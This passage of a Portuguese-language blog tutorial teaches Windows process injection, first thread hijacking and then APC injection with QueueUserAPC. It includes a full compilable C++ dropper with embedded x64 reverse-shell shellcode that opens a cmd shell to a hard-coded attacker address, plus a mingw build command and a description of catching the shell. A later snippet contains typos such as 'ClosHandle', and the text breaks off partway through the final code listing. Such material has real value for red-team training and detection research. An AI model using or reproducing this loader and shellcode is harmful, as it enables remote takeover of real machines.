class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre><td class="rouge-code"><pre><span class="n">THREADENTRY32</span> <span class="n">te</span><span class="p">;</span>
<span class="n">CONTEXT</span> <span class="n">cont</span><span class="p">;</span>
<span class="n">HANDLE</span> <span class="n">ht</span><span class="p">;</span>

<span class="n">thSnapshot</span> <span class="o">=</span> <span class="n">CreateToolhelp32Snapshot</span><span class="p">(</span><span class="n">TH32CS_SNAPTHREAD</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
<span class="k">if</span> <span class="p">(</span><span class="n">Thread32First</span><span class="p">(</span><span class="n">thSnapshot</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">te</span><span class="p">))</span> <span class="p">{</span>
	<span class="k">do</span> <span class="p">{</span>
		<span class="k">if</span> <span class="p">(</span><span class="n">pid</span> <span class="o">==</span> <span class="n">te</span><span class="p">.</span><span class="n">th32OwnerProcessID</span><span class="p">)</span> <span class="p">{</span>
			<span class="n">ht</span> <span class="o">=</span> <span class="n">OpenThread</span><span class="p">(</span><span class="n">THREAD_ALL_ACCESS</span><span class="p">,</span> <span class="n">FALSE</span><span class="p">,</span> <span class="n">te</span><span class="p">.</span><span class="n">th32ThreadID</span><span class="p">);</span>
			<span class="k">break</span><span class="p">;</span>
		<span class="p">}</span>
	<span class="p">}</span> <span class="k">while</span><span class="p">(</span><span class="n">Thread32Next</span><span class="p">(</span><span class="n">thSnapshot</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">te</span><span class="p">))</span>
<span class="p">}</span>
</pre></table></code></div></div><p>Com o <em>handle</em> desta <em>thread</em>, podemos usar a função <a href="https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-suspendthread">SuspendThread</a> para suspendê-la.</p><div lang="cpp" class="language-cpp highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">SuspendThread</span><span class="p">(</span><span class="n">ht</span><span class="p">);</span>
</pre></table></code></div></div><p>Agora o processo fica interessante, pois com a <em>thread</em> suspensa, podemos manipulá-la. Primeiramente, precisamos captar o contexto desta <em>thread</em> com a função <a href="https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-getthreadcontext">GetThreadContext</a>, esta função salva o contexto da <em>thread</em> em uma estrutura <a href="https://learn.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-context">CONTEXT</a>, esta estrutura armazena, entre outras informações, o valor configurado para cada registrador do processador, responsável pela execução da <em>thread</em>.</p><div lang="cpp" class="language-cpp highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">GetThreadContext</span><span class="p">(</span><span class="n">ht</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">cont</span><span class="p">)</span>
</pre></table></code></div></div><p>Uma vez que temos o estado de cada registrador, também podemos modificá-los, e é nesse ponto que modificamos o <code class="language-plaintext highlighter-rouge">RIP</code> (<em>instruction pointer</em>) da <em>thread</em> para apontar para o endereço do <em>buffer</em> para onde copiamos nosso <em>payload</em>.</p><div lang="cpp" class="language-cpp highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">cont</span><span class="p">.</span><span class="n">Rip</span> <span class="o">=</span> <span class="p">(</span><span class="n">DWORD_PTR</span><span class="p">)</span><span class="n">remoteB</span><span class="p">;</span>
</pre></table></code></div></div><p>Após a alteração do contexto, usamos a função <a href="https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-setthreadcontext">SetThreadContext</a> para gravar o contexto adulterado. E, em seguida, resumimos a <em>thread</em> com a função <a href="https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-resumethread">ResumeThread</a>.</p><div lang="cpp" class="language-cpp highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="n">SetThreadContext</span><span class="p">(</span><span class="n">ht</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">cont</span><span class="p">);</span>
<span class="n">ResumeThread</span><span class="p">(</span><span class="n">ht</span><span class="p">);</span>
</pre></table></code></div></div><p>Juntando tudo no código, temos:</p><div lang="cpp" class="language-cpp highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103
104
105
106
107
108
109
110
111
112
113
114
115
116
117
118
119
120
121
122
123
124
</pre><td class="rouge-code"><pre><span class="cp">#include</span> <span class="cpf">&lt;windows.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;tlhelp32.h&gt;</span><span class="cp">
</span>
<span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">payload</span><span class="p">[]</span> <span class="o">=</span> <span class="s">"</span><span class="se">\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41</span><span class="s">"</span>
<span class="s">"</span><span class="se">\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01</span><span class="s">"</span>
<span class="s">"</span><span class="se">\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x12\xe9\x57\xff\xff\xff\x5d\x49\xbe\x77\x73\x32\x5f\x33</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x32\x00\x00\x41\x56\x49\x89\xe6\x48\x81\xec\xa0\x01\x00</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x00\x49\x89\xe5\x49\xbc\x02\x00\x20\xfb\xc0\xa8\x47\x80</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x41\x54\x49\x89\xe4\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07</span><span class="s">"</span>
<span class="s">"</span><span class="se">\xff\xd5\x4c\x89\xea\x68\x01\x01\x00\x00\x59\x41\xba\x29</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x80\x6b\x00\xff\xd5\x50\x50\x4d\x31\xc9\x4d\x31\xc0\x48</span><span class="s">"</span>
<span class="s">"</span><span class="se">\xff\xc0\x48\x89\xc2\x48\xff\xc0\x48\x89\xc1\x41\xba\xea</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x0f\xdf\xe0\xff\xd5\x48\x89\xc7\x6a\x10\x41\x58\x4c\x89</span><span class="s">"</span>
<span class="s">"</span><span class="se">\xe2\x48\x89\xf9\x41\xba\x99\xa5\x74\x61\xff\xd5\x48\x81</span><span class="s">"</span>
<span class="s">"</span><span class="se">\xc4\x40\x02\x00\x00\x49\xb8\x63\x6d\x64\x00\x00\x00\x00</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x00\x41\x50\x41\x50\x48\x89\xe2\x57\x57\x57\x4d\x31\xc0</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x6a\x0d\x59\x41\x50\xe2\xfc\x66\xc7\x44\x24\x54\x01\x01</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x48\x8d\x44\x24\x18\xc6\x00\x68\x48\x89\xe6\x56\x50\x41</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x50\x41\x50\x41\x50\x49\xff\xc0\x41\x50\x49\xff\xc8\x4d</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x89\xc1\x4c\x89\xc1\x41\xba\x79\xcc\x3f\x86\xff\xd5\x48</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x31\xd2\x48\xff\xca\x8b\x0e\x41\xba\x08\x87\x1d\x60\xff</span><span class="s">"</span>
<span class="s">"</span><span class="se">\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff\xd5</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5</span><span class="s">"</span><span class="p">;</span>

<span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">payload_len</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">payload</span><span class="p">);</span>

<span class="kt">int</span> <span class="nf">findPID</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">procName</span><span class="p">)</span> <span class="p">{</span>

    <span class="n">HANDLE</span> <span class="n">hSnapshot</span><span class="p">;</span>
    <span class="n">PROCESSENTRY32</span> <span class="n">pe32</span><span class="p">;</span>
    <span class="kt">int</span> <span class="n">pid</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="n">BOOL</span> <span class="n">proc</span><span class="p">;</span>

    <span class="c1">// snapshot de todos os processos em execucao</span>
    <span class="n">hSnapshot</span> <span class="o">=</span> <span class="n">CreateToolhelp32Snapshot</span><span class="p">(</span><span class="n">TH32CS_SNAPPROCESS</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">INVALID_HANDLE_VALUE</span> <span class="o">==</span> <span class="n">hSnapshot</span><span class="p">)</span> <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>

    <span class="c1">// inicializando dwSize</span>
    <span class="n">pe32</span><span class="p">.</span><span class="n">dwSize</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">PROCESSENTRY32</span><span class="p">);</span>

    <span class="c1">// inicio da iteracao, primeiro processo</span>
    <span class="n">proc</span> <span class="o">=</span> <span class="n">Process32First</span><span class="p">(</span><span class="n">hSnapshot</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">pe32</span><span class="p">);</span>

    <span class="c1">// loop para iterar sobre os processos</span>
    <span class="k">while</span> <span class="p">(</span><span class="n">proc</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">strcmp</span><span class="p">(</span><span class="n">procName</span><span class="p">,</span> <span class="n">pe32</span><span class="p">.</span><span class="n">szExeFile</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">pid</span> <span class="o">=</span> <span class="n">pe32</span><span class="p">.</span><span class="n">th32ProcessID</span><span class="p">;</span>
            <span class="k">break</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="n">proc</span> <span class="o">=</span> <span class="n">Process32Next</span><span class="p">(</span><span class="n">hSnapshot</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">pe32</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="c1">// fecha o handle aberto</span>
    <span class="n">CloseHandle</span><span class="p">(</span><span class="n">hSnapshot</span><span class="p">);</span>
    <span class="k">return</span> <span class="n">pid</span><span class="p">;</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span><span class="o">*</span> <span class="n">argv</span><span class="p">[])</span> <span class="p">{</span>
    <span class="kt">int</span> <span class="n">pid</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="n">HANDLE</span> <span class="n">procH</span><span class="p">;</span> <span class="c1">// process handle</span>
    <span class="n">HANDLE</span> <span class="n">remoteT</span><span class="p">;</span> <span class="c1">// remote thread</span>
    <span class="n">LPVOID</span> <span class="n">remoteB</span><span class="p">;</span> <span class="c1">// remote buffer</span>

    <span class="n">HANDLE</span> <span class="n">ht</span><span class="p">;</span> <span class="c1">// thread handle</span>
    <span class="n">HANDLE</span> <span class="n">thSnapshot</span><span class="p">;</span>
    <span class="n">THREADENTRY32</span> <span class="n">te</span><span class="p">;</span>
    <span class="n">CONTEXT</span> <span class="n">cont</span><span class="p">;</span>

    <span class="n">pid</span> <span class="o">=</span> <span class="n">findPID</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>

    <span class="c1">// configurando o contexto e o sizeof da THREADENTRY32</span>
    <span class="n">cont</span><span class="p">.</span><span class="n">ContextFlags</span> <span class="o">=</span> <span class="n">CONTEXT_FULL</span><span class="p">;</span>
    <span class="n">te</span><span class="p">.</span><span class="n">dwSize</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">THREADENTRY32</span><span class="p">);</span>

    <span class="c1">// cria o handle para o processo</span>
    <span class="n">procH</span> <span class="o">=</span> <span class="n">OpenProcess</span><span class="p">(</span><span class="n">PROCESS_ALL_ACCESS</span><span class="p">,</span> <span class="n">FALSE</span><span class="p">,</span> <span class="n">DWORD</span><span class="p">(</span><span class="n">pid</span><span class="p">));</span>

    <span class="c1">// aloca o buffer de memoria no processo remoto</span>
    <span class="n">remoteB</span> <span class="o">=</span> <span class="n">VirtualAllocEx</span><span class="p">(</span><span class="n">procH</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">payload_len</span><span class="p">,</span> <span class="p">(</span><span class="n">MEM_RESERVE</span> <span class="o">|</span> <span class="n">MEM_COMMIT</span><span class="p">),</span> <span class="n">PAGE_EXECUTE_READWRITE</span><span class="p">);</span>

    <span class="c1">// copia o payload entre os processos</span>
    <span class="n">WriteProcessMemory</span><span class="p">(</span><span class="n">procH</span><span class="p">,</span> <span class="n">remoteB</span><span class="p">,</span> <span class="n">payload</span><span class="p">,</span> <span class="n">payload_len</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>

    <span class="c1">// encontrando o ID da thread para sequestrar</span>
    <span class="n">thSnapshot</span> <span class="o">=</span> <span class="n">CreateToolhelp32Snapshot</span><span class="p">(</span><span class="n">TH32CS_SNAPTHREAD</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">Thread32First</span><span class="p">(</span><span class="n">thSnapshot</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">te</span><span class="p">))</span> <span class="p">{</span>
        <span class="k">do</span> <span class="p">{</span>
            <span class="k">if</span> <span class="p">(</span><span class="n">pid</span> <span class="o">==</span> <span class="n">te</span><span class="p">.</span><span class="n">th32OwnerProcessID</span><span class="p">)</span> <span class="p">{</span>
                <span class="n">ht</span> <span class="o">=</span> <span class="n">OpenThread</span><span class="p">(</span><span class="n">THREAD_ALL_ACCESS</span><span class="p">,</span> <span class="n">FALSE</span><span class="p">,</span> <span class="n">te</span><span class="p">.</span><span class="n">th32ThreadID</span><span class="p">);</span>
                <span class="k">break</span><span class="p">;</span>
            <span class="p">}</span>
        <span class="p">}</span> <span class="k">while</span> <span class="p">(</span><span class="n">Thread32Next</span><span class="p">(</span><span class="n">thSnapshot</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">te</span><span class="p">));</span>
    <span class="p">}</span>

    <span class="c1">// suspendendo a thread encontrada</span>
    <span class="n">SuspendThread</span><span class="p">(</span><span class="n">ht</span><span class="p">);</span>
    <span class="c1">// capturando seu contexto</span>
    <span class="n">GetThreadContext</span><span class="p">(</span><span class="n">ht</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">cont</span><span class="p">);</span>
    <span class="c1">// Alterando o registrador RIP</span>
    <span class="n">cont</span><span class="p">.</span><span class="n">Rip</span> <span class="o">=</span> <span class="p">(</span><span class="n">DWORD_PTR</span><span class="p">)</span><span class="n">remoteB</span><span class="p">;</span>
    <span class="c1">// gravando a alteração</span>
    <span class="n">SetThreadContext</span><span class="p">(</span><span class="n">ht</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">cont</span><span class="p">);</span>
    <span class="c1">// resumindo a thread</span>
    <span class="n">ResumeThread</span><span class="p">(</span><span class="n">ht</span><span class="p">);</span>

    <span class="n">CloseHandle</span><span class="p">(</span><span class="n">procH</span><span class="p">);</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</pre></table></code></div></div><p>Podemos compilar o programa:</p><div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nv">$ </span>x86_64-w64-mingw32-g++ <span class="nt">-O2</span> dropper.cpp <span class="nt">-o</span> dropper.exe <span class="nt">-mconsole</span> <span class="nt">-s</span> <span class="nt">-ffunction-sections</span> <span class="nt">-fdata-sections</span> <span class="nt">-Wno-write-strings</span> <span class="nt">-fno-exceptions</span> <span class="nt">-fmerge-all-constants</span> <span class="nt">-static-libstdc</span>++ <span class="nt">-static-libgcc</span> <span class="nt">-fpermissive</span>
</pre></table></code></div></div><p>Na máquina alvo, podemos iniciar uma instância do notepad, por exemplo, e executar nosso programa.</p><p><img data-proofer-ignore data-src="/img/posts/Pasted%20image%2020240808214501.png" alt="" /></p><p>Na máquina atacante, recebemos o <em>reverse shell</em>.</p><p><img data-proofer-ignore data-src="/img/posts/Pasted%20image%2020240808214554.png" alt="" /></p><p>Ao analisarmos com o <em>Process Hacker 2</em>, vemos que o notepad tem um processo filho do CMD.</p><p><img data-proofer-ignore data-src="/img/posts/Pasted%20image%2020240808215236.png" alt="" /></p><p>Porém, uma característica única desse método, é que, mesmo que o notepad seja encerrado, a <em>thread</em> continua existindo em <em>background</em> e o <em>payload</em> ainda em execução.</p><h1 id="apc-injection">APC <em>Injection</em></h1><p>APC (<em>Asynchronous Procedure Call</em>) é um mecanismo do Windows que permite que uma função (ou procedimento) seja executada de forma assíncrona em uma determinada <em>thread</em>. Em outras palavras, é um método pelo qual o kernel ou um processo do modo usuário pode solicitar a execução de uma função em um contexto de <em>thread</em> específico em um momento posterior.</p><h2 id="tipos-de-apcs">Tipos de APCs</h2><p>Existem dois tipos principais de APCs no Windows:</p><ol><li><p><strong><em>Kernel-Mode APCs</em></strong>: São APCs que são enfileiradas e executadas pelo kernel do Windows. Geralmente, são usadas pelo sistema operacional para operações de baixo nível, como I/O assíncrono. Por exemplo, quando uma operação de leitura ou gravação de arquivo é feita de forma assíncrona, o driver de dispositivo pode usar um APC de modo kernel para notificar o sistema que a operação foi concluída.</p><li><p><strong><em>User-Mode APCs</em></strong>: São APCs enfileiradas em <em>threads</em> de modo usuário. Eles são mais flexíveis do que os APCs de modo kernel e podem ser usados por aplicativos para realizar operações como notificação de eventos ou execução de tarefas após a conclusão de uma operação assíncrona.</p></ol><h2 id="como-funciona-um-apc">Como Funciona um APC?</h2><p>Um APC é associado a uma <em>thread</em> específica. Quando um APC é enfileirado para uma <em>thread</em>, ele permanece na fila de APCs dessa <em>thread</em> até que a <em>thread</em> esteja em um estado em que processe o APC. Uma <em>thread</em> pode processar APCs de modo usuário quando está em um estado de “<em>alertable wait</em>”, o que significa que a <em>thread</em> está em espera, mas pode ser interrompido para processar APCs.</p><h3 id="fluxo-de-trabalho">Fluxo de Trabalho:</h3><ol><li><p><strong>Enfileiramento do APC</strong>: Um APC é enfileirado em uma <em>thread</em> usando funções como <code class="language-plaintext highlighter-rouge">QueueUserAPC</code> para APCs de modo usuário ou funções específicas do kernel para APCs de modo kernel.</p><li><p><strong><em>Alertable Wait</em></strong>: A <em>thread</em> deve estar em um estado em que ele possa processar o APC. No caso de um APC de modo usuário, a <em>thread</em> deve estar em uma <em>alertable wait</em> (usando funções como <code class="language-plaintext highlighter-rouge">SleepEx</code>, <code class="language-plaintext highlighter-rouge">WaitForSingleObjectEx</code>, <code class="language-plaintext highlighter-rouge">WaitForMultipleObjectsEx</code>, etc.).</p><li><p><strong>Execução do APC</strong>: Quando a <em>thread</em> está em um estado de <em>alertable wait</em>, o APC enfileirado é executado. O sistema retira o APC da fila e chama a função associada ao APC.</p></ol><h2 id="utilização-prática-dos-apcs">Utilização Prática dos APCs</h2><h3 id="operações-de-io-assíncronas">Operações de I/O Assíncronas:</h3><p>Um dos usos mais comuns dos APCs é em operações de entrada/saída (I/O) assíncronas. Por exemplo, quando um programa solicita uma operação de leitura ou gravação de arquivo de forma assíncrona, ele pode especificar uma função de retorno de chamada que será executada como um APC quando a operação for concluída.</p><h3 id="manipulação-de-sinais-e-notificações">Manipulação de Sinais e Notificações:</h3><p>APCs podem ser usados para manipular sinais ou notificações em uma <em>thread</em>. Um exemplo disso seria a manipulação de eventos de sincronização onde, ao invés de uma <em>thread</em> ficar em loop verificando a conclusão de uma tarefa, ela pode usar um APC para ser notificado quando a tarefa estiver concluída.</p><h2 id="fluxo-de-injeção">Fluxo de injeção</h2><p>Conforme vimos, existem alguns pré-requisitos para o funcionamento do <em>APC Injection</em>, primeiramente, é preciso que a <em>thread</em> alvo esteja em estado <em>alertable wait</em>, porém, não existe uma função que nos diga o estado de uma <em>thread</em>, logo, não podemos escolher a <em>thread</em> correta.</p><p>Porém, com o uso dos <em>snapshots</em> conseguimos obter o ID de <strong>todas</strong> as <em>threads</em> existentes em um processo, e provavelmente uma delas deve estar em estado <em>alertable wait</em>, nesse caso, podemos criar um vetor que contenha o ID de todas as <em>threads</em> do processo alvo, e iterar sobre ele usando a função <a href="https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-queueuserapc">QueueUserAPC</a> para tentar enfileirar um APC em todas elas.</p><p>A função <code class="language-plaintext highlighter-rouge">QueueUserAPC</code> tem a seguinte sintaxe:</p><div lang="cpp" class="language-cpp highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre><span class="n">DWORD</span> <span class="nf">QueueUserAPC</span><span class="p">(</span>
  <span class="p">[</span><span class="n">in</span><span class="p">]</span> <span class="n">PAPCFUNC</span>  <span class="n">pfnAPC</span><span class="p">,</span>
  <span class="p">[</span><span class="n">in</span><span class="p">]</span> <span class="n">HANDLE</span>    <span class="n">hThread</span><span class="p">,</span>
  <span class="p">[</span><span class="n">in</span><span class="p">]</span> <span class="n">ULONG_PTR</span> <span class="n">dwData</span>
<span class="p">);</span>
</pre></table></code></div></div><p>Onde:</p><ul><li><code class="language-plaintext highlighter-rouge">[in] pfnAPC</code> é um ponteiro para a função a ser executada quando a <em>thread</em> executar uma operação <em>alertable wait</em>, em nosso caso, um ponteiro para o buffer onde injetamos o código;<li><code class="language-plaintext highlighter-rouge">[in] hThread</code> um <em>handle</em> para a <em>thread</em> alvo;<li><code class="language-plaintext highlighter-rouge">[in] dwData</code> um parâmetro a ser passado para a função apontada para o APC, caso exista.</ul><h2 id="implementação-no-código">Implementação no código</h2><p>Primeiramente, precisamos enumerar todas as <em>threads</em> do processo alvo, para isso criaremos uma função que receberá o PID do processo alvo e um vetor que receberá os IDs das suas <em>threads</em>. Criaremos nesta função um <em>snapshot</em> de todas as <em>threads</em> e iteraremos sobre elas comparando o PID do processo dono.</p><div lang="cpp" class="language-cpp highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
</pre><td class="rouge-code"><pre><span class="n">DWORD</span> <span class="nf">getThIDs</span><span class="p">(</span><span class="n">DWORD</span> <span class="n">pid</span><span class="p">,</span> <span class="n">std</span><span class="o">::</span><span class="n">vector</span><span class="o">&lt;</span><span class="n">DWORD</span><span class="o">&gt;&amp;</span> <span class="n">thIds</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">HANDLE</span> <span class="n">thSnapshot</span><span class="p">;</span>
    <span class="n">THREADENTRY32</span> <span class="n">te</span><span class="p">;</span>
    <span class="n">te</span><span class="p">.</span><span class="n">dwSize</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">THREADENTRY32</span><span class="p">);</span>

    <span class="n">thSnapshot</span> <span class="o">=</span> <span class="n">CreateToolhelp32Snapshot</span><span class="p">(</span><span class="n">TH32CS_SHAPTHREAD</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">Thread32First</span><span class="p">(</span><span class="n">thSnapshot</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">te</span><span class="p">))</span> <span class="p">{</span>
        <span class="k">do</span> <span class="p">{</span>
            <span class="c1">// comparando o pid do processo com o pid do dono da thread</span>
            <span class="k">if</span> <span class="p">(</span><span class="n">pid</span> <span class="o">==</span> <span class="n">te</span><span class="p">.</span><span class="n">th32OwnerProcessID</span><span class="p">)</span> <span class="p">{</span>
                <span class="c1">//caso positivo, adiciona o ID da thread no vetor</span>
                <span class="n">thIds</span><span class="p">.</span><span class="n">push_back</span><span class="p">(</span><span class="n">te</span><span class="p">.</span><span class="n">th32ThreadID</span><span class="p">);</span>
            <span class="p">}</span>
        <span class="p">}</span> <span class="k">while</span> <span class="p">(</span><span class="n">Thread32Next</span><span class="p">(</span><span class="n">thSnapshot</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">te</span><span class="p">));</span>
    <span class="p">}</span>

    <span class="n">ClosHandle</span><span class="p">(</span><span class="n">thSnapshot</span><span class="p">);</span>
    <span class="k">return</span> <span class="o">!</span><span class="n">thIds</span><span class="p">.</span><span class="n">empty</span><span class="p">();</span>
<span class="p">}</span>
</pre></table></code></div></div><p>Uma vez que temos o vetor com os IDs de todas as <em>threads</em> do processo alvo, podemos implementar o código que fará a iteração com vetor, utilizando a função <code class="language-plaintext highlighter-rouge">QueueUserAPC</code> apara enfileirar um APC em cada uma, apontando para o buffer onde copiamos o <em>payload</em>.</p><div lang="cpp" class="language-cpp highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre>    <span class="c1">// iterando sobre os IDs das threads</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">getThIDs</span><span class="p">(</span><span class="n">pid</span><span class="p">,</span> <span class="n">thIds</span><span class="p">))</span> <span class="p">{</span>
        <span class="k">for</span> <span class="p">(</span><span class="n">DWORD</span> <span class="n">thId</span> <span class="o">:</span> <span class="n">thIds</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">ht</span> <span class="o">=</span> <span class="n">OpenThread</span><span class="p">(</span><span class="n">THREAD_SET_CONTEXT</span><span class="p">,</span> <span class="n">FALSE</span><span class="p">,</span> <span class="n">thId</span><span class="p">);</span>
            <span class="k">if</span> <span class="p">(</span><span class="n">ht</span><span class="p">)</span> <span class="p">{</span>
                <span class="n">QueueUserAPC</span><span class="p">((</span><span class="n">PAPCFUNC</span><span class="p">)</span><span class="n">remoteB</span><span class="p">,</span> <span class="n">ht</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
                <span class="n">CloseHandle</span><span class="p">(</span><span class="n">ht</span><span class="p">);</span>
            <span class="p">}</span>
        <span class="p">}</span>
    <span class="p">}</span>
</pre></table></code></div></div><p>O código completo fica:</p><div lang="cpp" class="language-cpp highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
